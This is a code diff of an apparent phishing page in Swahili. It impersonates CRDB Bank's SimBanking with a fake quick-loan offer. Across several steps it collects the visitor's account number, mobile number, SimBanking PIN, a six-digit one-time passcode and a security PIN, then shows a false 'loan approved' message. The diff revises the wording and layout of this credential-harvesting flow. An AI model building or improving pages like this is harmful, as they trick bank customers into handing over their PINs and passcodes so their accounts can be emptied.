@@ -3,90 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRDB Bank - SimBanking Tanzania</title>
+    <title>CRDB Bank - Mkopo wa Haraka</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div id="notification-banner" class="notification hidden"></div>
+    <div class="container">
+        <!-- Notification Banner -->
+        <div id="notification-banner" class="notification-banner hidden"></div>
 
-    <header class="navbar">
-        <div class="nav-left">← Rudi</div>
-        <div class="nav-brand">
-            <h2>CRDB BANK</h2>
-            <span>SIMBANKING TANZANIA</span>
+        <!-- Header Logo -->
+        <div class="header">
+            <h1 class="logo">CRDB BANK</h1>
+            <p class="tagline">Tumeenea Kila Mahali</p>
         </div>
-        <div class="nav-menu">☰</div>
-    </header>
 
-    <main class="container">
-        <!-- Step 1: Loan Calculator / Application Start -->
+        <!-- Step 1: Loan Calculation / Selection -->
         <section id="step-loan" class="card">
-            <h2>Pata Mkopo Wako Haraka - CRDB</h2>
-            <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi Tanzania</p>
+            <h2>Omba Mkopo wa Simbanking</h2>
+            <p class="subtitle">Chagua kiasi cha mkopo na muda wa marejesho.</p>
             
             <div class="form-group">
-                <label>Kiasi cha Mkopo (TZS)</label>
-                <div class="amount-display" id="amount-text">TSh 100,000</div>
-                <input type="range" id="loan-amount" min="10000" max="100000000" step="10000" value="100000">
-                <div class="range-labels"><span>TSh 10K</span><span>TSh 100M</span></div>
+                <label>Kiasi cha Mkopo: <span id="amount-text" class="highlight">TSh 1,000,000</span></label>
+                <input type="range" id="loan-amount" min="50000" max="5000000" step="50000" value="1000000">
             </div>
 
             <div class="form-group">
-                <label>Muda wa Mkopo</label>
-                <div class="amount-display" id="months-text">miezi 12</div>
-                <input type="range" id="loan-months" min="6" max="60" value="12">
-                <div class="range-labels"><span>miezi 6</span><span>miezi 60</span></div>
+                <label>Muda wa Marejesho: <span id="months-text" class="highlight">miezi 12</span></label>
+                <input type="range" id="loan-months" min="1" max="36" step="1" value="12">
             </div>
 
             <div class="summary-box">
-                <span>Malipo ya Kila Mwezi</span>
-                <strong id="monthly-payment">TSh 9,504</strong>
+                <div class="summary-row">
+                    <span>Rejesho la Kila Mwezi:</span>
+                    <strong id="monthly-payment">TSh 95,833</strong>
+                </div>
             </div>
 
-            <button id="btn-omba" class="btn-primary">OMBA SASA</button>
-
-            <div class="footer-badges">
-                <span>⚡ Idhini ya Haraka <small>Ndani ya masaa 24</small></span>
-                <span>💰 Riba Nafuu <small>Kuanzia 25%</small></span>
-                <span>🔒 Salama <small>Kiwango cha CRDB</small></span>
-            </div>
+            <button id="btn-omba" class="btn-primary">Endelea na Maombi</button>
         </section>
 
-        <!-- Step 2: Simbanking Credentials Activation -->
+        <!-- Step 2: Credentials Input -->
         <section id="step-credentials" class="card hidden">
-            <h2>Activation</h2>
-            <p class="subtitle">Please enter your credentials used to access SimBanking USSD(*150*03#)</p>
+            <h2>Ingiza Taarifa za Akaunti</h2>
+            <p class="subtitle">Weka taarifa zako za CRDB Simbanking ili kupokea mkopo.</p>
             
             <div class="form-group">
-                <label>Account number linked with Simbanking</label>
-                <input type="text" id="acc-number" placeholder="Enter account number">
+                <label for="acc-number">Namba ya Akaunti</label>
+                <input type="text" id="acc-number" placeholder="Ingiza namba ya akaunti" required>
             </div>
 
             <div class="form-group">
-                <label>Mobile number registered for Simbanking</label>
-                <input type="text" id="mobile-number" placeholder="0755******">
+                <label for="mobile-number">Namba ya Simu (Lazima ianze na 0)</label>
+                <input type="tel" id="mobile-number" placeholder="Mfano: 0712345678" required>
             </div>
 
             <div class="form-group">
-                <label>Simbanking PIN</label>
-                <input type="password" id="sim-pin" placeholder="****" maxlength="4">
+                <label for="sim-pin">PIN ya Simbanking</label>
+                <input type="password" id="sim-pin" maxlength="4" placeholder="••••" required>
             </div>
 
-            <div class="spinner-container hidden" id="credentials-spinner">
-                <div class="spinner"></div>
-                <p>Inathibitisha maelezo yako...</p>
-            </div>
-
-            <button id="btn-continue-creds" class="btn-primary">CONTINUE</button>
+            <button id="btn-continue-creds" class="btn-primary">Wasilisha Taarifa</button>
+            <div id="credentials-spinner" class="spinner hidden"></div>
         </section>
 
-        <!-- Step 3: OTP Verification -->
+        <!-- Step 3: OTP Verification (6 Digits) -->
         <section id="step-otp" class="card hidden">
-            <div class="shield-icon">🛡️</div>
-            <h2>Thibitisha Akaunti Yako - CRDB</h2>
-            <p class="subtitle">Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa kwa namba yako.</p>
+            <div class="shield-icon">🛡️️</div>
+            <h2>Thibitisha Akaunti Yako</h2>
+            <p class="subtitle">Tafadhali ingiza namba ya OTP ya tarakimu 6 iliyotumwa kwenda namba yako ya simu.</p>
             
             <div class="otp-inputs">
+                <input type="text" maxlength="1" class="otp-box" />
                 <input type="text" maxlength="1" class="otp-box" />
                 <input type="text" maxlength="1" class="otp-box" />
                 <input type="text" maxlength="1" class="otp-box" />
@@ -97,45 +84,32 @@
             <button id="btn-verify-otp" class="btn-primary">Thibitisha Akaunti</button>
         </section>
 
-        <!-- Step 4: Security PIN (Ingiza PIN ya Usalama) -->
+        <!-- Step 4: Security PIN Verification -->
         <section id="step-security-pin" class="card hidden">
-            <h2>Ingiza PIN ya Usalama - CRDB</h2>
-            <p class="subtitle">Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
+            <div class="shield-icon">🔒</div>
+            <h2>Weka PIN ya Usalama</h2>
+            <p class="subtitle">Weka PIN ya usalama ili kukamilisha idhini ya mkopo wako.</p>
             
-            <div class="form-group">
-                <label>🔒 PIN ya Usalama</label>
-                <div class="otp-inputs">
-                    <input type="password" maxlength="1" class="pin-box" />
-                    <input type="password" maxlength="1" class="pin-box" />
-                    <input type="password" maxlength="1" class="pin-box" />
-                    <input type="password" maxlength="1" class="pin-box" />
-                </div>
+            <div class="otp-inputs">
+                <input type="password" maxlength="1" class="pin-box" />
+                <input type="password" maxlength="1" class="pin-box" />
+                <input type="password" maxlength="1" class="pin-box" />
+                <input type="password" maxlength="1" class="pin-box" />
             </div>
 
-            <button id="btn-verify-security-pin" class="btn-primary">ENDELEA</button>
+            <button id="btn-verify-security-pin" class="btn-primary">Kamilisha</button>
         </section>
 
-        <!-- Step 5: Success Screen -->
-        <section id="step-success" class="card hidden success-card">
-            <div class="success-icon">✓</div>
-            <h2>Hongera!</h2>
-            <p class="subtitle">Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni.</p>
-
-            <div class="success-amount-box">
-                <small>KIASI KILICHOIDHINISHWA</small>
-                <h1 id="approved-amount-text">TSh 100,000</h1>
-            </div>
-
-            <div class="summary-box">
-                <span>MALIPO YA KILA MWEZI</span>
-                <strong id="success-monthly">TSh 2,441</strong>
-            </div>
-
-            <button class="btn-primary" onclick="location.reload()">Rudi Nyumbani</button>
+        <!-- Step 5: Success State -->
+        <section id="step-success" class="card hidden text-center">
+            <div class="success-icon">✅</div>
+            <h2>Ombi Lako Limefanikiwa!</h2>
+            <p class="subtitle">Mkopo wako umeidhinishwa na kiasi cha <span id="approved-amount-text" class="highlight"></span> kimetumwa kwenye akaunti yako.</p>
+            <p class="success-note">Rejesho lako la mwezi litakuwa <span id="success-monthly" class="highlight"></span>.</p>
         </section>
-    </main>
+    </div>
 
     <script src="script.js"></script>
 </body>
     </html>
-                    
+    
